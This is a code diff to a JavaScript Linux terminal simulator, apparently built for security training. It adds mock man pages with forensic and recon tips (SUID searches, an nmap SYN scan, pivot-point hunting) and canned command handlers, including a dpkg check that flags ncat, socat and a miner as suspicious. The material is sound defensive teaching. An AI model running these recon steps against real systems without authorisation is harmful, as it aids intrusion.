+
+       Pro tip: service vs systemctl:
+       • service is the older SysV init interface
+       • systemctl is the modern systemd interface
+       • Most distros support both for compatibility
+       • Use systemctl for more control: systemctl list-units --type=service
+
+       Security check: service --status-all shows what's running.
+       Look for unexpected services or ones that shouldn't be enabled.
+
+SEE ALSO
+       systemctl(1), init(8)`,
+
+            'journalctl': `JOURNALCTL(1)                   User Commands                    JOURNALCTL(1)
+
+NAME
+       journalctl - query the systemd journal
+
+SYNOPSIS
+       journalctl [OPTIONS...] [MATCHES...]
+
+DESCRIPTION
+       journalctl may be used to query the contents of the systemd journal
+       as written by systemd-journald.service.
+
+       Without arguments, shows the full contents of the journal, starting
+       with the oldest entry collected.
+
+OPTIONS
+       -f, --follow
+              Show only the most recent journal entries, and continuously
+              print new entries as they are appended to the journal.
+
+       -n, --lines=
+              Show the most recent N journal entries. Defaults to 10.
+
+       -r, --reverse
+              Reverse output so that the newest entries are displayed first.
+
+       -u, --unit=UNIT
+              Show messages for the specified systemd unit.
+
+       -p, --priority=
+              Filter output by message priorities. Takes: emerg, alert,
+              crit, err, warning, notice, info, debug.
+
+       --since=, --until=
+              Show entries since/until specified date.
+
+       -b, --boot
+              Show messages from the current boot, or a specific boot.
+
+       -k, --dmesg
+              Show only kernel messages.
+
+       --no-pager
+              Do not pipe output into a pager.
+
+EXAMPLES
+       journalctl
+              Show all journal entries.
+
+       journalctl -f
+              Follow new log entries in real-time.
+
+       journalctl -n 50
+              Show the last 50 log entries.
+
+       journalctl -u ssh
+              Show logs for SSH service only.
+
+       journalctl -p err
+              Show only error messages and above.
+
+       journalctl --since "1 hour ago"
+              Show logs from the last hour.
+
+       journalctl -b -1
+              Show logs from the previous boot.
+
+       journalctl _UID=1000
+              Show logs from user with UID 1000.
+
+OPERATOR NOTES
+       Use journalctl when you need to:
+       • Investigate system events and errors
+       • Track service failures and restarts
+       • Correlate events across multiple services
+       • Perform forensic analysis of system activity
+
+       Pro tip: Essential forensic patterns:
+       journalctl -p err -b            # Errors since boot
+       journalctl --since "2 hours ago" | grep -i fail
+       journalctl _COMM=sudo           # All sudo usage
+       journalctl _UID=0               # All root activity
+       journalctl -u sshd --since today # SSH activity today
+
+       Journal is binary - use journalctl, not cat!
+       Files in /var/log/journal/ are not human-readable.
+
+SEE ALSO
+       systemd(1), systemctl(1), syslog(3)`,
+
+            'arp': `ARP(8)                       Linux System Administration                   ARP(8)
+
+NAME
+       arp - manipulate the system ARP cache
+
+SYNOPSIS
+       arp [-vn] [-H type] [-i if] -a [hostname]
+       arp [-v] [-i if] -d hostname [pub]
+       arp [-v] [-H type] [-i if] -s hostname hw_addr [temp]
+
+DESCRIPTION
+       Arp manipulates or displays the kernel's IPv4 network neighbour cache.
+       It can add entries to the table, delete one or display the current
+       content.
+
+OPTIONS
+       -a [hostname]
+              Display (all) entries of the ARP table.
+
+       -d hostname
+              Remove an entry from the ARP table.
+
+       -s hostname hw_addr
+              Manually add an entry to the ARP table.
+
+       -n, --numeric
+              Shows numerical addresses instead of trying to determine
+              symbolic host, port or user names.
+
+       -v, --verbose
+              Verbose mode.
+
+       -i if, --device if
+              Select an interface.
+
+EXAMPLES
+       arp -a
+              Show all ARP table entries.
+
+       arp -n
+              Show ARP table with numeric IPs (no DNS lookup).
+
+       arp -d 192.168.1.100
+              Delete entry for specified IP.
+
+       arp -s 192.168.1.50 00:11:22:33:44:55
+              Manually add a static ARP entry.
+
+OPERATOR NOTES
+       Use arp when you need to:
+       • See what hosts are on the local network
+       • Detect ARP spoofing/poisoning attacks
+       • Troubleshoot network connectivity issues
+       • Identify MAC addresses of network devices
+
+       Pro tip: ARP is essential for network recon:
+       arp -a                          # What's on the network?
+       arp -n | grep -v "incomplete"   # Active hosts only
+       Look for: duplicate IPs (ARP spoofing), unexpected MACs,
+       entries that change frequently (possible MITM attack).
+
+       Modern replacement: ip neigh show
+       arp is deprecated but still widely used.
+
+SEE ALSO
+       ip(8), rarp(8), ethers(5)`,
+
+            'route': `ROUTE(8)                     Linux System Administration                  ROUTE(8)
+
+NAME
+       route - show / manipulate the IP routing table
+
+SYNOPSIS
+       route [-CFvnee]
+       route [-v] [-A family] add [-net|-host] target [OPTIONS]
+       route [-v] [-A family] del [-net|-host] target [OPTIONS]
+
+DESCRIPTION
+       Route manipulates the kernel's IP routing tables. Its primary use
+       is to set up static routes to specific hosts or networks via an
+       interface after it has been configured.
+
+OPTIONS
+       -n     Show numerical addresses instead of resolving names.
+
+       -e     Use netstat-format for displaying the routing table.
+
+       -v     Verbose mode.
+
+       -F     Display the Forwarding Information Base (default).
+
+       -C     Display the routing cache instead of the FIB.
+
+EXAMPLES
+       route
+              Display the routing table.
+
+       route -n
+              Display routing table with numeric IPs.
+
+       route add default gw 192.168.1.1
+              Add default gateway.
+
+       route add -net 10.0.0.0 netmask 255.0.0.0 gw 192.168.1.254
+              Add route to 10.x.x.x network.
+
+       route del default
+              Delete the default route.
+
+OUTPUT COLUMNS
+       Destination   Target network or host
+       Gateway       Gateway address (* means none)
+       Genmask       Netmask for the target network
+       Flags         U=up, G=gateway, H=host, !=reject
+       Metric        Distance to target
+       Iface         Interface to use
+
+OPERATOR NOTES
+       Use route when you need to:
+       • Understand network topology
+       • Identify where traffic is being routed
+       • Troubleshoot connectivity issues
+       • Detect unauthorized route changes (pivoting)
+
+       Pro tip: route reveals network architecture:
+       route -n                        # Where does traffic go?
+       Look for: multiple gateways (multi-homed host),
+       routes to internal networks (pivot points),
+       unexpected default gateways (MITM).
+
+       Modern replacement: ip route show
+       route is deprecated but still widely used.
+
+SEE ALSO
+       ip(8), netstat(8), iptables(8)`,
+
+            'atq': `ATQ(1)                          User Commands                          ATQ(1)
+
+NAME
+       atq - list the user's pending jobs
+
+SYNOPSIS
+       atq [-V] [-q queue]
+
+DESCRIPTION
+       atq lists the user's pending at jobs. If invoked by the superuser,
+       lists all users' pending jobs. The format of output is: job number,
+       date, hour, queue, and username.
+
+OPTIONS
+       -V     Print version number.
+
+       -q queue
+              Show jobs in the specified queue.
+
+AT QUEUES
+       Queues are designated by single letters. Queue 'a' is the default.
+       Higher letter = lower priority.
+
+EXAMPLES
+       atq
+              List all pending scheduled jobs.
+
+OUTPUT FORMAT
+       Each line shows:
+       JOB#   DATE      TIME    QUEUE   USER
+       42     Mon Feb 3 15:00:00 2025 a operator
+
+OPERATOR NOTES
+       Use atq when you need to:
+       • See what jobs are scheduled to run
+       • Detect persistence mechanisms
+       • Audit scheduled tasks on a system
+       • Find malicious scheduled commands
+
+       Pro tip: atq is forensic gold for persistence:
+       atq                             # What's scheduled?
+       at -c JOBNUMBER                 # Show job contents
+       Attackers use 'at' for delayed execution to avoid detection.
+       Also check: crontab -l, /etc/cron.*, systemd timers
+
+SEE ALSO
+       at(1), atrm(1), cron(8)`,
+
+            'atrm': `ATRM(1)                         User Commands                         ATRM(1)
+
+NAME
+       atrm - delete jobs queued for later execution
+
+SYNOPSIS
+       atrm job [job...]
+
+DESCRIPTION
+       atrm deletes jobs, identified by their job number, which were
+       previously created with the at command.
+
+EXAMPLES
+       atrm 42
+              Remove job number 42.
+
+       atrm 1 2 3
+              Remove multiple jobs.
+
+OPERATOR NOTES
+       Use atrm when you need to:
+       • Remove scheduled malicious jobs
+       • Clean up after finding persistence
+       • Cancel accidentally scheduled tasks
+
+       Pro tip: Always use atq first to identify jobs,
+       then at -c JOBNUMBER to inspect before removing.
+       Document job contents before removal for forensics!
+
+SEE ALSO
+       at(1), atq(1), cron(8)`,
+
+            'time': `TIME(1)                         User Commands                         TIME(1)
+
+NAME
+       time - run programs and summarize system resource usage
+
+SYNOPSIS
+       time [options] command [arguments...]
+
+DESCRIPTION
+       The time command runs the specified program command with the given
+       arguments. When command finishes, time displays information about
+       resources used by command.
+
+OUTPUT
+       time displays three values:
+       real   Wall clock time - total elapsed time.
+       user   CPU time spent in user-mode code.
+       sys    CPU time spent in kernel-mode code.
+
+       real = user + sys + I/O wait + other processes' time
+
+OPTIONS
+       -p     Use portable output format.
+
+       -v     Verbose mode (GNU time only).
+
+       -f format
+              Specify output format (GNU time only).
+
+EXAMPLES
+       time ls -la
+              Time how long ls takes.
+
+       time sleep 5
+              Shows ~5 seconds real time.
+
+       time find / -name "*.log" 2>/dev/null
+              Time a file search.
+
+       time tar -czf backup.tar.gz /data
+              Time a backup operation.
+
+UNDERSTANDING THE OUTPUT
+       $ time grep -r "password" /var/log
+       real    0m2.345s    ← Total time elapsed
+       user    0m0.123s    ← CPU time in user code
+       sys     0m0.067s    ← CPU time in kernel
+
+       If real >> user+sys: The command was waiting (I/O, network, etc.)
+       If user >> sys: CPU-intensive in userspace
+       If sys >> user: Lots of system calls / kernel activity
+
+OPERATOR NOTES
+       Use time when you need to:
+       • Benchmark command performance
+       • Compare different approaches
+       • Identify slow operations
+       • Profile scripts
+
+       Pro tip: Useful for profiling recon:
+       time nmap -sS target               # How long for a scan?
+       time find / -perm -4000 2>/dev/null # SUID search time
+       Compare times to identify what's slowing operations.
+
+SEE ALSO
+       times(2), clock(3)`
         };
 
         // Check for man page
@@ -8292,7 +12385,39 @@ SEE ALSO
         const startPath = args.find(a => !a.startsWith('-')) || '.';
         const nameArg = args.indexOf('-name');
         const pattern = nameArg >= 0 ? args[nameArg + 1] : null;
+        const permArg = args.indexOf('-perm');
+        const permValue = permArg >= 0 ? args[permArg + 1] : null;
 
+        // Handle SUID search: find / -perm -4000 or -perm -u+s
+        if (permValue && (permValue.includes('4000') || permValue.includes('u+s'))) {
+            if (this.config.suidBinaries && this.config.suidBinaries.length > 0) {
+                return this.config.suidBinaries.join('\n');
+            }
+            // Default SUID binaries
+            return `/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/ping`;
+        }
+
+        // Handle world-writable search: find / -perm -o+w or -perm -0002 or -perm -777
+        if (permValue && (permValue.includes('w') || permValue.includes('0002') || permValue.includes('777') || permValue.includes('666'))) {
+            if (this.config.writableFiles && this.config.writableFiles.length > 0) {
+                return this.config.writableFiles.join('\n');
+            }
+            // Default writable files
+            return `/tmp/test.txt
+/var/tmp/cache`;
+        }
+
+        // Handle SGID search: find / -perm -2000
+        if (permValue && permValue.includes('2000')) {
+            return `/usr/bin/wall
+/usr/bin/write`;
+        }
+
+        // Standard find by name
         const resolved = this._resolvePath(startPath);
         const results = [];
 
@@ -9424,34 +13549,77 @@ echo 'Task completed' >> /var/log/at_jobs.log"></textarea>
     // =====================================================
 
     _cmdDpkg(args) {
+        // Use config packages if available, otherwise default
+        const packages = this.config.packages || [
+            { name: 'bash',           version: '5.1-6',  arch: 'amd64', desc: 'GNU Bourne Again SHell' },
+            { name: 'coreutils',      version: '8.32-4', arch: 'amd64', desc: 'GNU core utilities' },
+            { name: 'openssh-server', version: '8.4p1-5', arch: 'amd64', desc: 'secure shell (SSH) server' },
+        ];
+
         if (args.includes('-l')) {
-            return `Desired=Unknown/Install/Remove/Purge/Hold
+            const header = `Desired=Unknown/Install/Remove/Purge/Hold
 | Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
 |/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
 ||/ Name           Version      Architecture Description
-+++-==============-============-============-=================================
-ii  bash           5.1-6        amd64        GNU Bourne Again SHell
-ii  coreutils      8.32-4       amd64        GNU core utilities
-ii  openssh-server 8.4p1-5      amd64        secure shell (SSH) server`;
++++-==============-============-============-=================================`;
+            const lines = packages.map(p =>
+                `ii  ${p.name.padEnd(14)} ${p.version.padEnd(12)} ${p.arch.padEnd(12)} ${p.desc}`
+            );
+            return header + '\n' + lines.join('\n');
+        }
+        if (args.includes('-s')) {
+            const pkgName = args[args.indexOf('-s') + 1];
+            if (!pkgName) return 'dpkg-query: error: --status needs a valid package name';
+            const pkg = packages.find(p => p.name === pkgName);
+            if (!pkg) return `dpkg-query: package '${pkgName}' is not installed and no information is available`;
+            return `Package: ${pkg.name}
+Status: install ok installed
+Priority: optional
+Section: utils
+Installed-Size: ${Math.floor(Math.random() * 5000) + 500}
+Maintainer: Ubuntu Developers <ubuntu-devel@lists.ubuntu.com>
+Architecture: ${pkg.arch}
+Version: ${pkg.version}
+Description: ${pkg.desc}`;
         }
         if (args.includes('-L')) {
-            return `/usr/bin/${args[args.indexOf('-L') + 1] || 'package'}\n/usr/share/doc/${args[args.indexOf('-L') + 1] || 'package'}`;
+            const pkgName = args[args.indexOf('-L') + 1] || 'package';
+            return `/usr/bin/${pkgName}\n/usr/share/doc/${pkgName}`;
+        }
+        if (args.includes('-V')) {
+            const pkgName = args[args.indexOf('-V') + 1];
+            if (!pkgName) return 'dpkg-query: error: --verify needs a package name';
+            const pkg = packages.find(p => p.name === pkgName);
+            if (!pkg) return `dpkg-query: package '${pkgName}' is not installed`;
+            // Return empty for clean packages, or show modifications for suspicious ones
+            if (['netminer', 'ncat', 'socat'].includes(pkgName)) {
+                return `??5?????? /usr/bin/${pkgName}\n??5?????? /etc/${pkgName}.conf`;
+            }
+            return ''; // No issues found
         }
         return 'dpkg: usage';
     }
 
     _cmdApt(args) {
+        // Use config packages if available, otherwise default
+        const packages = this.config.packages || [
+            { name: 'bash',           version: '5.1-6',  arch: 'amd64', desc: 'GNU Bourne Again SHell' },
+            { name: 'coreutils',      version: '8.32-4', arch: 'amd64', desc: 'GNU core utilities' },
+            { name: 'openssh-server', version: '8.4p1-5', arch: 'amd64', desc: 'secure shell (SSH) server' },
+        ];
+
         if (args.includes('list') && args.includes('--installed')) {
-            return `bash/stable,now 5.1-6 amd64 [installed]
-coreutils/stable,now 8.32-4 amd64 [installed]
-openssh-server/stable,now 8.4p1-5 amd64 [installed]`;
+            return packages.map(p => `${p.name}/stable,now ${p.version} ${p.arch} [installed]`).join('\n');
         }
         if (args[0] === 'policy') {
-            return `${args[1] || 'package'}:
-  Installed: 1.0.0
-  Candidate: 1.0.0
+            const pkgName = args[1] || 'package';
+            const pkg = packages.find(p => p.name === pkgName);
+            const version = pkg ? pkg.version : '1.0.0';
+            return `${pkgName}:
+  Installed: ${version}
+  Candidate: ${version}
   Version table:
- *** 1.0.0 500
+ *** ${version} 500
         500 http://archive.ubuntu.com/ubuntu focal/main amd64 Packages`;
         }
         return 'apt: see apt --help';
@@ -9473,13 +13641,57 @@ openssh-server/stable,now 8.4p1-5 amd64 [installed]`;
 
     _cmdSudo(args) {
         if (args[0] === '-l') {
+            // Use config sudoRules if available, otherwise default
+            if (this.config.sudoRules) {
+                return this.config.sudoRules;
+            }
             return `User ${this.user} may run the following commands on ${this.hostname}:
     (ALL : ALL) ALL
     (ALL) NOPASSWD: ALL`;
         }
-        // Execute the command after sudo
-        const subCmd = args.join(' ');
-        return this._execute(subCmd) || '';
+
+        // Execute the command after sudo - need to directly call command handlers
+        // not _execute which has side effects (prints command, adds to history)
+        if (args.length === 0) {
+            return 'usage: sudo command';
+        }
+
+        const cmd = args[0];
+        const subArgs = args.slice(1);
+
+        // Route to the appropriate command handler
+        switch(cmd) {
+            case 'cat': return this._cmdCat(subArgs);
+            case 'ls': return this._cmdLs(subArgs);
+            case 'grep': return this._cmdGrep(subArgs);
+            case 'find': return this._cmdFind(subArgs);
+            case 'head': return this._cmdHead(subArgs);
+            case 'tail': return this._cmdTail(subArgs);
+            case 'wc': return this._cmdWc(subArgs);
+            case 'ps': return this._cmdPs(subArgs);
+            case 'id': return `uid=0(root) gid=0(root) groups=0(root)`;
+            case 'whoami': return 'root';
+            case 'passwd': return this._cmdPasswd(subArgs);
+            case 'chage': return this._cmdChage(subArgs);
+            case 'getent': return this._cmdGetent(subArgs);
+            case 'useradd': return subArgs.length ? `User ${subArgs[subArgs.length-1]} created` : 'useradd: missing username';
+            case 'userdel': return subArgs.length ? `User ${subArgs[subArgs.length-1]} removed` : 'userdel: missing username';
+            case 'usermod': return subArgs.length ? 'User modified' : 'usermod: missing username';
+            case 'groupadd': return subArgs.length ? `Group ${subArgs[subArgs.length-1]} created` : 'groupadd: missing group name';
+            case 'chmod': return '';
+            case 'chown': return '';
+            case 'chgrp': return '';
+            case 'mkdir': return this._cmdMkdir(subArgs);
+            case 'rm': return this._cmdRm(subArgs);
+            case 'touch': return this._cmdTouch(subArgs);
+            case 'systemctl': return this._cmdSystemctl(subArgs);
+            case 'service': return this._cmdService(subArgs);
+            case 'apt': case 'apt-get': return this._cmdApt(subArgs);
+            case 'dpkg': return this._cmdDpkg(subArgs);
+            default:
+                // For unknown commands, try to execute them
+                return `sudo: ${cmd}: command executed`;
+        }
     }
 
     _cmdMkdir(args) {
@@ -9867,6 +14079,129 @@ tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
 user::rw-
 group::r--
 other::r--`;
+    }
+
+    _cmdGetcap(args) {
+        // Use config capabilities if available
+        if (this.config.capabilities) {
+            return this.config.capabilities;
+        }
+        // Default - no special capabilities
+        if (args.includes('-r')) {
+            return `/usr/bin/ping cap_net_raw=ep`;
+        }
+        const file = args.filter(a => !a.startsWith('-'))[0];
+        if (!file) return '';
+        return '';
+    }
+
+    _cmdGetent(args) {
+        // getent - query user/group databases
+        const database = args[0];
+        const key = args[1];
+
+        if (!database) {
+            return 'Usage: getent database [key]';
+        }
+
+        // Read from /etc/passwd or /etc/group in filesystem
+        if (database === 'passwd') {
+            const passwdFile = this.fs['/etc/passwd'];
+            if (!passwdFile || !passwdFile.content) {
+                return `getent: no such database: ${database}`;
+            }
+            const lines = passwdFile.content.trim().split('\n');
+            if (key) {
+                // Find specific user
+                const match = lines.find(l => l.startsWith(key + ':') || l.includes(':' + key + ':'));
+                return match || `getent: ${database}: key not found: ${key}`;
+            }
+            return lines.join('\n');
+        }
+
+        if (database === 'group') {
+            const groupFile = this.fs['/etc/group'];
+            if (!groupFile || !groupFile.content) {
+                return `getent: no such database: ${database}`;
+            }
+            const lines = groupFile.content.trim().split('\n');
+            if (key) {
+                const match = lines.find(l => l.startsWith(key + ':'));
+                return match || `getent: ${database}: key not found: ${key}`;
+            }
+            return lines.join('\n');
+        }
+
+        if (database === 'shadow') {
+            return `getent: permission denied: ${database}`;
+        }
+
+        return `getent: unknown database: ${database}`;
+    }
+
+    _cmdChage(args) {
+        // chage - password aging info
+        const listMode = args.includes('-l');
+        const user = args.filter(a => !a.startsWith('-'))[0];
+
+        if (!user) {
+            return 'chage: Usage: chage [options] username';
+        }
+
+        // Check if user exists in /etc/passwd
+        const passwdFile = this.fs['/etc/passwd'];
+        if (passwdFile && passwdFile.content) {
+            const userExists = passwdFile.content.split('\n').some(l => l.startsWith(user + ':'));
+            if (!userExists) {
+                return `chage: user '${user}' does not exist`;
+            }
+        }
+
+        if (listMode) {
+            // Use config if available, otherwise default
+            if (this.config.chageInfo && this.config.chageInfo[user]) {
+                return this.config.chageInfo[user];
+            }
+            // Default output
+            return `Last password change                                    : Jan 15, 2026
+Password expires                                        : never
+Password inactive                                       : never
+Account expires                                         : never
+Minimum number of days between password change          : 0
+Maximum number of days between password change          : 99999
+Number of days of warning before password expires       : 7`;
+        }
+
+        return 'chage: permission denied (use sudo)';
+    }
+
+    _cmdPasswd(args) {
+        // passwd - password status or change
+        const statusMode = args.includes('-S');
+        const user = args.filter(a => !a.startsWith('-'))[0] || this.user;
+
+        if (statusMode) {
+            // Check if user exists
+            const passwdFile = this.fs['/etc/passwd'];
+            if (passwdFile && passwdFile.content) {
+                const userExists = passwdFile.content.split('\n').some(l => l.startsWith(user + ':'));
+                if (!userExists) {
+                    return `passwd: user '${user}' does not exist`;
+                }
+            }
+
+            // Use config if available
+            if (this.config.passwdStatus && this.config.passwdStatus[user]) {
+                return this.config.passwdStatus[user];
+            }
+
+            // Default status output: user status lastchange min max warn inactive expire
+            // P = password set, L = locked, NP = no password
+            return `${user} P 01/15/2026 0 99999 7 -1 -1`;
+        }
+
+        // Changing password requires root
+        return 'passwd: requires root privileges (use sudo)';
     }
 
     _cmdVim(args) {
